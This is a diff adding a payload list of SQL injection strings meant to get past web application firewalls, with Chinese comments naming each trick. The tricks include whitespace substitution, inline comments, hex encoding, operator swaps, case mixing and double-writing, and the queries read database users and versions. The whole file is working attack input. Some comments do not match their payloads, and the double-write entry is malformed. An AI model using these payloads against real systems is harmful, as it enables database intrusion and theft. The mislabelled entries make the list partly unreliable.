@@ -1,0 +1,40 @@
+# SQLi WAF 绕过 - 空白字符替换绕过空格过滤 (%09 TAB)
+'%09UNION%09SELECT%091,user(),database(),4,5%09FROM%09mysql.user--
+# SQLi WAF 绕过 - 空白字符替换绕过空格过滤 (%0A 换行)
+'%0AUNION%0ASELECT%0A1,user(),version(),4,5%0AFROM%0Amysql.user--
+# SQLi WAF 绕过 - 空白字符替换绕过空格过滤 (%0C 换页)
+'%0CUNION%0CSELECT%0C1,user(),database(),4,5--
+# SQLi WAF 绕过 - 空白字符替换绕过空格过滤 (%0D 回车)
+'%0DUNION%0DSELECT%0D1,version(),3,4,5--
+# SQLi WAF 绕过 - 空白字符替换绕过空格过滤 (%A0 不间断空格)
+'%A0UNION%A0SELECT%A01,user(),database(),4,5--
+# SQLi WAF 绕过 - 多行注释替换空格
+1/**/AND/**/1=1--
+# SQLi WAF 绕过 - 内联注释绕过 WAF 关键字检测
+1/*!UNION*//*!SELECT*/1,user(),3--
+# SQLi WAF 绕过 - 括号分组替代空格
+1=(SELECT(1)FROM(users)WHERE(1=1))--
+# SQLi WAF 绕过 - 反引号包裹关键字绕过检测
+1%60UNION%60SELECT%601,2,3--
+# SQLi WAF 绕过 - 科学计数法替代等号
+'.e(0)UNION.e(0)SELECT.e(0)1,user(),version(),4,5.e(0)FROM.e(0)dual--
+# SQLi WAF 绕过 - 十六进制编码绕过关键字检测
+1 UNION SELECT 0x61646d696e,0x70617373776f7264,3--
+# SQLi WAF 绕过 - LIKE 替代等号
+1 AND 'a' LIKE 'a'--
+# SQLi WAF 绕过 - REGEXP 替代等号
+1 AND 'a' REGEXP '^a'--
+# SQLi WAF 绕过 - BETWEEN 替代等号
+1 AND 1 BETWEEN 1 AND 1--
+# SQLi WAF 绕过 - || 替代 OR
+'||(SELECT user())||'1'='1
+# SQLi WAF 绕过 - && 替代 AND
+'%26%26(SELECT 1 FROM mysql.user WHERE user='root')>0--
+# SQLi WAF 绕过 - 大小写混合绕过关键字过滤
+1 UnIoN SeLeCt 1,version(),3--
+# SQLi WAF 绕过 - 双写绕过 WAF 关键字删除
+1 UNIUNIONSELECTON SELECT 1,user(),3--
+# SQLi WAF 绕过 - 百分号绕过
+1 UNION SELECT 1,2,3 FROM dual WHERE 1=1 AND 2344=2344 AND '1q'='1q
+# SQLi WAF 绕过 - ORDER BY 盲注替代 UNION
+1 ORDER BY (SELECT 1 FROM information_schema.columns WHERE table_name=0x7573657273)--
